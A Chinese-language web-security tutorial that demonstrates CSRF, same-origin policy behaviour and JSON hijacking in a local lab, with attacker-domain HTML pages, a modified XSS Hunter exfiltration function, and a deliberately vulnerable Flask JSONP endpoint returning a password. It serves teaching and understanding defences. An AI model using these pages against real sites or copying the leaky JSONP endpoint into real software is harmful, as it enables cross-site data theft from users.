![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F01fa0b02-ea5b-41b6-bf25-df351db21231%2FDD9E1D6F-5F78-4B0F-866C-2B380868387E.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F01fa0b02-ea5b-41b6-bf25-df351db21231%2FDD9E1D6F-5F78-4B0F-866C-2B380868387E.png)

1. 127.0.0.1:8000（攻击域）
这里直接用`python -m SimpleHTTPServer`启动了
csrf.html

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <!-- <script src="./xsshunter.js"></script> -->
        <title>Title</title>
    </head>
    <body>
    <iframe src="<http://127.0.0.1:5000/sec/csrf/post>"></iframe>
    </body>
    </html>

首先我们在这里解决第一个问题，在什么时候会携带目标域的cookie。

本地测试，在同一个浏览器分别打开，`http://127.0.0.1:5000/sec/setcookies`，设置好cookie。
然后请求另一个域`http://127.0.0.1:8000/csrf.html`，抓包看一下效果。可以看到`<iframe src="<http://127.0.0.1:5000/sec/csrf/post>"></iframe>`请求携带上了目标域的cookie。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc27a4c5a-4451-4a41-b20a-584ec58141d2%2FA5C3B28B-A985-432D-B325-ADD722C0F91E.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc27a4c5a-4451-4a41-b20a-584ec58141d2%2FA5C3B28B-A985-432D-B325-ADD722C0F91E.png)

Flask的日志同时也验证了，确实接收了cookie。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00184afa-191f-4ebc-8f08-a2d343237b7c%2F9B8FAB94-34E0-4B22-B60B-4A8AC8CFA51F.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00184afa-191f-4ebc-8f08-a2d343237b7c%2F9B8FAB94-34E0-4B22-B60B-4A8AC8CFA51F.png)

由此可见，在iframe标签中的请求是会携带cookie的。以下还有几种标签也都会携带cookie，这些标签都是直接允许跨域获取数据的的。

    <script src="..."></script> 标签嵌入跨域脚本。
    <link rel="stylesheet" href="..."> 标签嵌入CSS。
    <img>嵌入图片。
    <video> 和 <audio>嵌入多媒体资源。
    <object>, <embed> 和 <applet> 的插件。
    @font-face 引入的字体。
    <frame> 和 <iframe> 载入的任何资源。

值得一说的，如果XMLrequest要请求中要包含cookie的话，需要设置把`withCredentials`属性设置为true，示例如下

    var xhr = new XMLHttpRequest();
    xhr.withCredentials = true; //设置包含cookie

现在解决第二个问题，CSRF的跨域请求是否违反了同源策略。很明显`127.0.0.1:5000`和`127.0.0.1:8000`因为端口不同，所以并不是同一个域，在浏览器中是要遵守同源策略的，既然如此，应该是无法请求获取响应的。
为了明白这个问题，我们需要认识到两点：

1. 同源策略仅针对浏览器，其它地方如burp，你抓包获取，是不用遵守同源策略的
2. 进行跨域的时候，其实请求已经成功，并且获取了响应数据，只是数据返回到浏览器中的时候，因为浏览器的同源策略，响应别拦截了，所以在浏览器中无法获取响应。

明白这两点，有助于我们更好的理解同源策略。

为了更好的理解，改一下前面的代码。
127.0.0.1:8000/csrf.html，这里包含了在讲解xssHunter的时候dump的JS代码

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <script src="./xsshunter.js"></script>
        <title>Title</title>
    </head>
    <body>
    <!-- <iframe src="<http://127.0.0.1:5000/sec/csrf/post>"></iframe> -->
    </body>
    </html>

稍微修改一些JS代码中的contact_mothership函数，便于测试。

    function contact_mothership( probe_return_data ) {
        var http = new XMLHttpRequest();
        var url = "<http://127.0.0.1:5000/sec/post/data>";// 修改URL
        //http.withCredentials = true;
        http.open("POST", url, true);
        http.setRequestHeader("Content-type", "text/plain");
        http.onreadystatechange = function() {
            if(http.readyState == 4 && http.status == 200) {
                 alert(http.responseText); //新增代码，用于显示返回内容
            }
        }
        if( pgp_key == null || pgp_key == "" ) {
            http.send( JSON.stringify( probe_return_data ) );
        } else {
            generate_pgp_encrypted_email( function( pgp_message ){
                http.send( pgp_message )
            });
        }
    }

127.0.0.1:5000
[sec.py](http://sec.py/)

    @interface.route('/post/data', methods=['GET','POST'])
    def postDataTest():
        if request.method == 'POST':
            print("POST DATA SUCCESS!!!")
            resp = make_response("cross site success")
            # resp.headers['Access-Control-Allow-Origin'] = '*'
            return resp

先看一下，CORS默认设置的情况下。
访问`http://127.0.0.1:8000/csrf.html`
用burp抓包，可以看到请求`http://127.0.0.1:5000/sec/post/data`发送的包，我们请求一下，可以看到正确返回响应内容了。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F41cf4436-0a75-422e-b52c-b49350c8a59f%2F92547F50-C113-4A22-A601-3E3EAC61C2C5.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F41cf4436-0a75-422e-b52c-b49350c8a59f%2F92547F50-C113-4A22-A601-3E3EAC61C2C5.png)

在回到浏览器端，没有触发弹窗，可以看到这里因为浏览器的同源策略，响应被拦截了。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9f8c6cad-a015-4684-bdc3-b9c9d51c7ccd%2FF03D4901-6120-49D5-96E6-F40BFB14F684.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9f8c6cad-a015-4684-bdc3-b9c9d51c7ccd%2FF03D4901-6120-49D5-96E6-F40BFB14F684.png)

接下来，再看一下CORS允许跨域的情况下。
`\\Access-Control-Allow-Origin`设置为`*`。
看一下效果。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8326e76a-501d-45f6-b980-2e78eb6ccc2f%2FE2783DC4-96AE-4464-B0C6-51B948BA8746.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F8326e76a-501d-45f6-b980-2e78eb6ccc2f%2FE2783DC4-96AE-4464-B0C6-51B948BA8746.png)

服务端，也接受请求，并执行了

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc90ef7a0-854c-4c8c-ac08-0e3bf481a941%2F5C5FB712-EC97-425E-A18C-C3F820122E87.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fc90ef7a0-854c-4c8c-ac08-0e3bf481a941%2F5C5FB712-EC97-425E-A18C-C3F820122E87.png)

可以看到，弹出了响应内容。也证明了同源策略仅在浏览器有效和跨域请求的时候，请求已经到达服务端，并且执行了。

关于CSRF的防护，添加referer验证，每次请求的时候带上随机token就可以了
flask的配置可以参考官方文档 [CSRF防护](http://docs.jinkan.org/docs/flask-wtf/csrf.html)，这里就不赘述了。

### JSON hijacking

接下来讲JSON hijacking，首先说一下这里面用到的跨域技术JSONP，JSONP（JSON with Padding）是数据格式JSON的一种“使用模式”，可以跨域获取其它域的数据。

其实用到的也就是前面说过的<script>等标签请求是不受同源策略限制的，而且携带目标域的cookie，并且是可以获取响应的。
它的时序图类似与下面的。
[image:A4C82563-8ECD-488D-B151-C558426481AB-330-000232F915C32BF1/81C0267A-3FA2-4FC0-B1B4-F2C258164F41.png]

1. 首先浏览器中的<script>标签中的src类似`http://xxx.com/api/getuserinfo?callbak=showdata`这样获取数据的URL，这时候浏览器加载页面，就会携带上`xxx.com`的目标域cookie去请求URL。
2. 接下来服务器端获取了请求，识别了用户身份，然后将会返回包含回调函数名的JSON对象响应

    showdata({
      "password": "123456", 
      "username": "admin"
    })

1. 浏览器接受了响应，因为请求是从script发送出去的，所以同源策略不会拦截响应。看响应可以直观的看出，这其实就是一个调用函数的JS对象。将会调用`showdata(arg)`函数，执行对应的操作。

这就是JSONP的整体流程了，JSON hijacking就是基于这种原理实现的，在返回的过程中，劫持了响应内容。因为如果不添加refer认证，服务端对谁都会返回响应的。

这里写个demo，
127.0.0.1:5000 目标域

    # 判断是否为admin，用户，返回个人信息
    @interface.route('/api/user/info', methods=['GET'])
    @jsonp
    def getUserInfo():
        if request.method == 'GET':
            username = request.cookies.get("username")
            if username == "admin":
                return jsonify({"username":"admin","password":"123456"})
    
    # jsonp测试
    @interface.route('/jsonp', methods=['GET'])
    def jsonpTest():
        if request.method == 'GET':
            resp = make_response(render_template('jsonp.html'))
            resp.headers['Content-Type'] = 'text/html'
            return resp

jsonp装饰器

    # jsonp 装饰器
    def jsonp(func):
    
        @wraps(func)
        def decorated_function(*args, **kwargs):
            callback = request.args.get('callback', False)
            if callback:
                content = str(callback) + '(' + str(
                    func(*args, **kwargs).data.decode('utf-8')) + ')'
                return current_app.response_class(
                    content, mimetype='application/javascript')
            else:
                return func(*args, **kwargs)
    
        return decorated_function

127.0.0.1:8000/getuser.html （攻击域）

    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <script type="text/javascript">
        	var showdata = function (json) {
        		alert('username: ' + json.username + ' \\npassword: ' + json.password);
        	}
        </script>
        <script src="<http://127.0.0.1:5000/sec/api/user/info?callback=showdata>">
        </script>
        <title>Title</title>
    </head>
    <body>
    </body>
    </html>

与CSRF本地测试差不多，cookie访问`http://127.0.0.1:5000/sec/setcookie` 设置好。这时候，访问`http://127.0.0.1:8000/getuser.html` 就可以看到效果了。

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00e56247-fe65-4d18-a994-5ad5e071f5a9%2FF33DDAE0-52F0-46A8-905B-A715913B59FA.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F00e56247-fe65-4d18-a994-5ad5e071f5a9%2FF33DDAE0-52F0-46A8-905B-A715913B59FA.png)

在请求过程中，可以看到返回的JSON对象

![https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F492f497f-0588-4ffb-bb2e-5c3713ec3598%2F016EF6FA-0306-4AD1-AC12-15DDBC6874A6.png](https://www.notion.so/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F492f497f-0588-4ffb-bb2e-5c3713ec3598%2F016EF6FA-0306-4AD1-AC12-15DDBC6874A6.png)

效果就相当于，调用了showdata这个函数，从而触发弹窗，弹出响应数据

    <script>
    	showdata(
    	{
    	  "password": "123456", 
    	  "username": "admin"
    	});
    </script>

关于JSON hIjacking的防护，与CSRF相同，这里就不赘述了。

## 总结

前端漏洞，有XSS（跨站脚本攻击），有CSRF，CORS，模板注入等等，不一而足，而他们对应的攻击和绕过方法，又花式繁多。想要将一段段payload记录下来，是不现实的，对漏洞的挖掘，还是希望可以深入到更深层的原理进行剖析和试验，了解其中的本质。而不仅仅仅限于表面，知道XSS可以弹窗，却不知道它弹窗的意义是什么，证明了什么。
这里推荐一本书《web之困》，这本书对浏览器的运行机制，包括HTTP协议，URL,同源策略等都进行了深刻的讲解，而里面对于常见web漏洞的讲解甚至只用了一章。看完这本书之后，对于浏览器的运行机制，会有一种茅塞顿开的感觉。

## 参考文献

1. 《web之困》
2. 《黑客攻防宝典-浏览器实战篇》
3. 《前端黑客技术解密》
4. [https://developer.mozilla.org/zh-CN/docs/Web](https://developer.mozilla.org/zh-CN/docs/Web)
5. [https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet](https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet)
6. [https://security.yirendai.com/news/share/26](https://security.yirendai.com/news/share/26)
7. [http://hackermio.me/2018/05/08/浅谈浏览器编解码/](http://hackermio.me/2018/05/08/%E6%B5%85%E8%B0%88%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E8%A7%A3%E7%A0%81/)
8. [https://fed.renren.com/2018/01/20/cross-origin/](https://fed.renren.com/2018/01/20/cross-origin/)